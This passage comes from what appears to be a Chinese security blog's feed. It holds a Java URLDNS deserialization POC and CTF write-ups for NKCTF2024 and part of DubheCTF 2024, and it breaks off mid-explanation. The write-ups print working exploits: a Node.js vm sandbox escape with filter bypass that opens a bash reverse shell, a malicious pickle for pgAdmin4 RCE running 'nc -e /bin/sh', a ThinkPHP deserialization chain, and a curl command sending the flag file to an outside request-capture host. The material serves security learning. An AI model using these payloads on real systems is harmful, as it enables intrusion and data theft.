class="headerlink" title="POC："></a>POC：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLDNS</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException&#123;         <span class="hljs-comment">//用writeObject写序列化文件。</span><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        HashMap&lt;URL,Integer&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL, Integer&gt;();    <span class="hljs-comment">//新建hashmap对象</span><br>        <span class="hljs-comment">//这里不要发起请求，把url对象的hashCode改成不是-1</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;https://www.baidu.com&quot;</span>);   <span class="hljs-comment">//新建URL的对象</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> url.getClass();    <span class="hljs-comment">//获取URL对象的类</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">hashcodefield</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);    <span class="hljs-comment">//获取URL对象的类中的hashCode属性</span><br>        hashcodefield.setAccessible(<span class="hljs-literal">true</span>);     <span class="hljs-comment">//因为hashCode是private的变量，所以需要设置</span><br>        hashcodefield.set(url,<span class="hljs-number">1234</span>);    <span class="hljs-comment">//设置hashCode值1234</span><br>        hashmap.put(url,<span class="hljs-number">1</span>);<br>        <span class="hljs-comment">//通过反射 改变已有对象属性</span><br>        hashcodefield.set(url,-<span class="hljs-number">1</span>);  <span class="hljs-comment">//这里把hashCode值改回-1</span><br>        serialize(hashmap);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="关于hashcodefield-set-url-1234"><a href="#关于hashcodefield-set-url-1234" class="headerlink" title="关于hashcodefield.set(url,1234);"></a>关于hashcodefield.set(url,1234);</h4><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/image-20240328112136169.png" alt="image-20240328111827604.png"></p><p>set方法的第一个参数是属性所对应的对象，这里属性是hashcodefield，对象是url，值是1234</p>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NKCTF2024</title>
    <link href="/2024/03/25/NKCTF2024/"/>
    <url>/2024/03/25/NKCTF2024/</url>
    
    <content type="html"><![CDATA[<h1 id="my-first-cms"><a href="#my-first-cms" class="headerlink" title="my first cms"></a>my first cms</h1><p><a href="https://avd.aliyun.com/detail?id=AVD-2024-27622">https://avd.aliyun.com/detail?id=AVD-2024-27622</a></p><p>弱口令登录</p><p>username : admin</p><p>password : Admin123</p><p>登录进去后：</p><p><img src="/img/NKCTF2024/1.png" alt="图片.png"></p><h1 id="全世界最简单的CTF"><a href="#全世界最简单的CTF" class="headerlink" title="全世界最简单的CTF"></a>全世界最简单的CTF</h1><p>给了&#x2F;secret源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>);<br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;fs&quot;</span>);<br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><br>app<br>  .<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>())<br>  .<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views&#x27;</span>, path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>))<br>  .<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;/public&#x27;</span>)))<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>)&#123;<br>  res.<span class="hljs-title function_">sendFile</span>(__dirname + <span class="hljs-string">&#x27;/public/home.html&#x27;</span>);<br>&#125;)<br><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">code</span>) &#123;<br>  <span class="hljs-keyword">let</span> pattern = <span class="hljs-regexp">/(process|\[.*?\]|exec|spawn|Buffer|\\|\+|concat|eval|Function)/g</span>;<br>  <span class="hljs-keyword">if</span>(code.<span class="hljs-title function_">match</span>(pattern))&#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;what can I say? hacker out!!&quot;</span>);<br>  &#125;<br>&#125;<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>)&#123;<br>  <span class="hljs-keyword">let</span> code = req.<span class="hljs-property">body</span>.<span class="hljs-property">code</span>;<br>  <span class="hljs-keyword">let</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br>  <span class="hljs-keyword">let</span> context = vm.<span class="hljs-title function_">createContext</span>(sandbox);<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-title function_">waf</span>(code)<br>    <span class="hljs-keyword">let</span> result = vm.<span class="hljs-title function_">runInContext</span>(code, context);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result);<br>  &#125; <span class="hljs-keyword">catch</span> (e)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e.<span class="hljs-property">message</span>);<br>    <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./hack&#x27;</span>);<br>  &#125;<br>&#125;)<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/secret&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>)&#123;<br>  <span class="hljs-keyword">if</span>(process.<span class="hljs-property">__filename</span> == <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">let</span> content = fs.<span class="hljs-title function_">readFileSync</span>(__filename, <span class="hljs-string">&quot;utf-8&quot;</span>);<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(content);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">let</span> content = fs.<span class="hljs-title function_">readFileSync</span>(process.<span class="hljs-property">__filename</span>, <span class="hljs-string">&quot;utf-8&quot;</span>);<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(content);<br>  &#125;<br>&#125;)<br><br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">()=&gt;</span>&#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;listen on 3000&quot;</span>);<br>&#125;)<br><br></code></pre></td></tr></table></figure><p>注意第25行开始的，很明显的vm沙箱逃逸。</p><p><a href="https://xz.aliyun.com/t/11859?time__1311=mqmx0DBD9DyDuBYD/QbiQQLpDfhxAOiqhiD&alichlgref=https://www.bing.com/#toc-3">https://xz.aliyun.com/t/11859?time__1311=mqmx0DBD9DyDuBYD%2FQbiQQLpDfhxAOiqhiD&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F#toc-3</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123;&#125;, &#123;<br>        <span class="hljs-attr">get</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>            <span class="hljs-keyword">const</span> cc = <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>.<span class="hljs-property">caller</span>;<br>            <span class="hljs-keyword">const</span> p = (cc.<span class="hljs-property">constructor</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;return process&#x27;</span></span>))();<br>            <span class="hljs-keyword">return</span> p.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;&quot;</span>).<span class="hljs-title function_">toString</span>();<br>        &#125;<br>    &#125;)<br></code></pre></td></tr></table></figure><p>这道题没回显，所以我们需要反弹shell，拿这个payload去打，剩下的是绕过过滤，这里过滤了我们需要的exec、process</p><p>对于process，他正则匹配没有i 也就是对大小写不敏感 我们可以通过js里面的 toLowerCase()绕过</p><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vhdl"><span class="hljs-symbol">&#x27;return</span> <span class="hljs-keyword">process</span>&#x27;变成<span class="hljs-symbol">&#x27;return</span> <span class="hljs-keyword">Process</span>&#x27;.toLowerCase();<br></code></pre></td></tr></table></figure><p>最难的是exec绕过，这个东西不是字符串，而是方法，所以我们并不能像之前两种方式绕过，我们选择 Reflect.get  方法绕过</p><p>推一篇文章nodejs的命令执行绕过的</p><p> <a href="https://www.anquanke.com/post/id/237032">https://www.anquanke.com/post/id/237032</a></p><p><img src="/img/NKCTF2024/2.png" alt="图片.png"></p><p><img src="/img/NKCTF2024/3.png" alt="图片.png"></p><p>简单点就是<strong>Reflect.get(a,b)&#x3D;a[b]</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123;&#125;, &#123;<br>        <span class="hljs-attr">get</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>            <span class="hljs-keyword">const</span> cc = <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>.<span class="hljs-property">caller</span>;<br>            <span class="hljs-keyword">const</span> g = (cc.<span class="hljs-property">constructor</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;return global&#x27;</span></span>))();   <span class="hljs-comment">//拿到所有函数</span><br>            <span class="hljs-keyword">const</span> p = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(g, <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(g).<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">x</span>=&gt;</span>x.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;pro&#x27;</span>))).<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(<span class="hljs-number">99</span>,<span class="hljs-number">104</span>,<span class="hljs-number">105</span>,<span class="hljs-number">108</span>,<span class="hljs-number">100</span>,<span class="hljs-number">95</span>,<span class="hljs-number">112</span>,<span class="hljs-number">114</span>,<span class="hljs-number">111</span>,<span class="hljs-number">99</span>,<span class="hljs-number">101</span>,<span class="hljs-number">115</span>,<span class="hljs-number">115</span>));<span class="hljs-comment">//编码绕过构造process.mainModule.require(&#x27;child_process&#x27;)</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(p, <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(p).<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">x</span>=&gt;</span>x.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;exe&#x27;</span>)))(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;&quot;</span>).<span class="hljs-title function_">toString</span>();<span class="hljs-comment">//构造exec函数</span><br>        &#125;<br>    &#125;)<br></code></pre></td></tr></table></figure><p><img src="/img/NKCTF2024/4.png" alt="图片.png"></p><h1 id="attack-tacooooo"><a href="#attack-tacooooo" class="headerlink" title="attack_tacooooo"></a>attack_tacooooo</h1><p>又要猜密码</p><p>给了帐号是<a href="mailto:&#116;&#97;&#99;&#111;&#x6f;&#x6f;&#x6f;&#x6f;&#64;&#x71;&#x71;&#x2e;&#99;&#x6f;&#109;">&#116;&#97;&#99;&#111;&#x6f;&#x6f;&#x6f;&#x6f;&#64;&#x71;&#x71;&#x2e;&#99;&#x6f;&#109;</a>，我怎么知道密码是多少，这还不是弱口令，纯猜，密码是tacooooo</p><p>登录进去后查看版本 pgAdmin4 8.3</p><p>直接去找漏洞，翻cve</p><p><a href="https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/">https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/</a></p><p><img src="/img/NKCTF2024/5.png" alt="图片.png"></p><p><img src="/img/NKCTF2024/6.png" alt="图片.png"></p><p><img src="/img/NKCTF2024/7.png" alt="图片.png"></p><p><img src="/img/NKCTF2024/8.png" alt="图片.png"></p><p>脚本也给了，我们稍微改改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">produce_pickle_bytes</span>(<span class="hljs-params">platform, cmd</span>):<br>    b = <span class="hljs-string">b&#x27;\x80\x04\x95&#x27;</span><br>    b += struct.pack(<span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-number">22</span> + <span class="hljs-built_in">len</span>(platform) + <span class="hljs-built_in">len</span>(cmd))<br>    b += <span class="hljs-string">b&#x27;\x8c&#x27;</span> + struct.pack(<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-built_in">len</span>(platform)) + platform.encode()<br>    b += <span class="hljs-string">b&#x27;\x94\x8c\x06system\x94\x93\x94&#x27;</span><br>    b += <span class="hljs-string">b&#x27;\x8c&#x27;</span> + struct.pack(<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-built_in">len</span>(cmd)) + cmd.encode()<br>    b += <span class="hljs-string">b&#x27;\x94\x85\x94R\x94.&#x27;</span><br>    <span class="hljs-built_in">print</span>(b)<br>    <span class="hljs-keyword">return</span> b<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;posix.pickle&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(produce_pickle_bytes(<span class="hljs-string">&#x27;posix&#x27;</span>, <span class="hljs-string">f&quot;nc ip port -e /bin/sh&quot;</span>))<br></code></pre></td></tr></table></figure><p>把运行脚本得到的pickle文件上传</p><p><img src="/img/NKCTF2024/9.png" alt="图片.png"></p><p><img src="/img/NKCTF2024/10.png" alt="图片.png"></p><p>注意这里是绝对路径</p><p> &#x2F;var&#x2F;lib&#x2F;pgadmin&#x2F;storage&#x2F;tacooooo_qq.com&#x2F;posix.pickle!a  </p><p>更换cookie之后监听端口，拿到shell结果半天找不到flag，最后在&#x2F;proc&#x2F;1&#x2F;environ里才找到flag</p><p><img src="/img/NKCTF2024/11.png" alt="图片.png"></p><h1 id="用过就是熟悉"><a href="#用过就是熟悉" class="headerlink" title="用过就是熟悉"></a>用过就是熟悉</h1><p>下载源码，在db.sql的938行，找到登录密码：!@!@!@!@NKCTFChu0</p><p><img src="/img/NKCTF2024/12.png" alt="图片.png"></p><p>登录进去后发现回收站里有个文件，我们恢复了。</p><p><img src="/img/NKCTF2024/13.png" alt="图片.png"></p><p>打开后发现这个文件是一个木马：</p><p><img src="/img/NKCTF2024/14.png" alt="图片.png"></p><p>那我们一个尝试文件包含它，然后执行命令。</p><h3 id="下面开始审计源码："><a href="#下面开始审计源码：" class="headerlink" title="下面开始审计源码："></a>下面开始审计源码：</h3><p>登陆页面源码在&#x2F;app&#x2F;controller&#x2F;user&#x2F;include.class.php</p><p>在loginSubmit方法里有这么一句：</p><p><img src="/img/NKCTF2024/15.png" alt="图片.png"></p><p>这里他说的tp是thinkphp的意思，然后在这里有个反序列化的点，那么我们肯定就需要构造反序列化链条攻击了。</p><p>thinkphp链子开头一般是__destruct，直接全局搜索一下：</p><p><img src="/img/NKCTF2024/16.png" alt="图片.png"></p><p>发现有三个，而前两个的__destruct()无法成功构成链子，只有第三个可以：</p><p><img src="/img/NKCTF2024/17.png" alt="图片.png"></p><p>根据p2zhh师傅的提示，这个链子跟thinkphp5.0.24反序列化漏洞很像。</p><p><a href="https://www.freebuf.com/articles/web/284091.html">https://www.freebuf.com/articles/web/284091.html</a></p><p>这里的close()为关闭文件的方法，没有利用点，而removeFiles()中有个数组可以触发__toString</p><p>全局搜素__toString，根据文章的提示，会到这里</p><p><img src="/img/NKCTF2024/18.png" alt="图片.png"></p><p>跟进toJson</p><p><img src="/img/NKCTF2024/19.png" alt="图片.png"></p><p>跟进toArray()</p><p><img src="/img/NKCTF2024/20.png" alt="图片.png"></p><p><img src="/img/NKCTF2024/21.png" alt="图片.png"></p><p>因为$items是受保护的属性，所以这里toArray()可以触发__get方法。</p><p><img src="/img/NKCTF2024/22.png" alt="图片.png"></p><p>这里的data是我们可控的。这里Loginsubmit方法不存在，所以我们就能调用__call方法 这里我们找到两个__call方法：</p><p>在Config.php中，这个__call能进行文件包含。</p><p><img src="/img/NKCTF2024/23.png" alt="图片.png"></p><p>先放poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">process</span>\<span class="hljs-title class_">pipes</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Collection</span>;              <span class="hljs-comment">//在链子起点Windows.php页面找到依赖，也写到这里，相当于包含其他文件，因为我们这里是跨文件的链条。</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pipes</span></span>&#123;                     <span class="hljs-comment">//windows类的父类，不要会报错</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Windows</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Pipes</span></span>&#123;             <span class="hljs-comment">//windows类的起点。</span><br>  <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span> = [];                  <span class="hljs-comment">//这里是数组。</span><br><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;files = [<span class="hljs-keyword">new</span> <span class="hljs-title class_">Collection</span>()];<span class="hljs-comment">//触发Collection类里的__toString()-&gt;toJson()-&gt;toArray()</span><br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>;                     <span class="hljs-comment">//不写会报错</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Collection</span></span>&#123;<br>  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$items</span> = [];<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;items=<span class="hljs-keyword">new</span> <span class="hljs-title class_">View</span>();              <span class="hljs-comment">//触发view类里的__get()</span><br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Config</span></span>&#123;                          <span class="hljs-comment">//包含文件__call方法所属的类</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">View</span></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$engine</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;name&quot;</span>=&gt;<span class="hljs-string">&quot;data/files/shell&quot;</span>);          <span class="hljs-comment">//include(&quot;./&quot;.$arguments[0][&#x27;name&#x27;]);是根据当前目录来的。</span><br>  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$data</span> = [];<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;data[<span class="hljs-string">&#x27;Loginout&#x27;</span>]=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">config</span>();         <span class="hljs-comment">//config类里的__call方法</span><br>  &#125;<br>&#125;<br><br><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">process</span>\<span class="hljs-title">pipes</span>\<span class="hljs-title">Windows</span>;         <span class="hljs-comment">//不写会报错</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Windows</span>()));<br></code></pre></td></tr></table></figure><p>得到payload后开始执行命令：</p><p><img src="/img/NKCTF2024/24.png" alt="图片.png"></p><p>这道题好像是无回显。</p><p>经过测试，好像没有bash和nc，反弹shell行不通，可能这道题不出网，那么就curl+DNS外带。</p><p>在线dns网站：<a href="https://requestrepo.com/#/requests">https://requestrepo.com/#/requests</a></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">system(<span class="hljs-string">&quot;curl -X POST --data `cat%20/f*` http://b62zii2y.requestrepo.com&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><img src="/img/NKCTF2024/25.png" alt="图片.png"></p><p><img src="/img/NKCTF2024/26.png" alt="图片.png"></p><p><img src="/img/NKCTF2024/27.png" alt="图片.png"></p><p>最后一个题不错，其他题挺水的</p>]]></content>
    
    
    <categories>
      
      <category>WPs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WPs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DubheCTF_2024</title>
    <link href="/2024/03/19/DubheCTF-2024/"/>
    <url>/2024/03/19/DubheCTF-2024/</url>
    
    <content type="html"><![CDATA[<p><strong>师傅们太强了，跟师傅们打比赛能学到很多东西，我就作出来一个最简单的题&#x3D;-&#x3D;</strong></p><h1 id="Master-of-Profile"><a href="#Master-of-Profile" class="headerlink" title="Master of Profile"></a><strong>Master of Profile</strong></h1><p>参考链接：<a href="https://cn-sec.com/archives/2105254.html">https://cn-sec.com/archives/2105254.html</a><br>想读配置文件，这道题api_mode是flase，<br><img src="/img/DubheCTF_2024/1.png"><br>readConf首先没法，if语句无法控制。在审代码，如果要rce，必须得拿到token，token在config里，我在找如何能读到config<br>缓存好像被关了，不能通过写恶意命令进服务器来，但是有一个updateconf路由能修改配置文件。<br><img src="/img/DubheCTF_2024/2.png"><br>目前的思路是：拿到token，修改配置文件，打开缓存，在vps上写反弹shell的恶意代码，然后让服务器访问，并写入缓存，再读取缓存，反弹shell。<br>在render路由会loadflie可以读token<br><img src="/img/DubheCTF_2024/3.png"><br><img src="/img/DubheCTF_2024/4.png"><br>尝试读一下pref.ini、pref.toml、pref.yml<br>读到了配置文件：render?path&#x3D;pref.yml<br>Token 是不会变的：189069462103782304169366230<br><img src="/img/DubheCTF_2024/5.png"><br><img src="/img/DubheCTF_2024/11.png"><br>缓存果然是关闭了的<br>一个包发过去<br>POST <a href="http://1.95.13.243:39891/updateconf?token=189069462103782304169366230&type=direct">http://1.95.13.243:39891/updateconf?token=189069462103782304169366230&type=direct</a><br>把enable_cache改成true<br><img src="/img/DubheCTF_2024/6.png"><br>把恶意代码写入缓存：<br><a href="http://1.95.13.243:37193/sub?target=clash&url=http://47.108.89.135/payload&token=189069462103782304169366230">http://1.95.13.243:37193/sub?target=clash&url=http://47.108.89.135/payload&token=189069462103782304169366230</a><br><img src="/img/DubheCTF_2024/7.png"><br>经过md5加密后，现在看缓存目录，恶意代码已经被我们写上去了<br><img src="/img/DubheCTF_2024/8.png"><br>在sub路由的subconverter函数中，一定会调用addNodes函数，我们跟进。这里有关键eval函数。<br><img src="/img/DubheCTF_2024/9.png"><br>先把 url 里的 \ 替换为空，然后我们可以看到这里rce关键点。检查头部是否为 script:，然后使用 split 函数分割 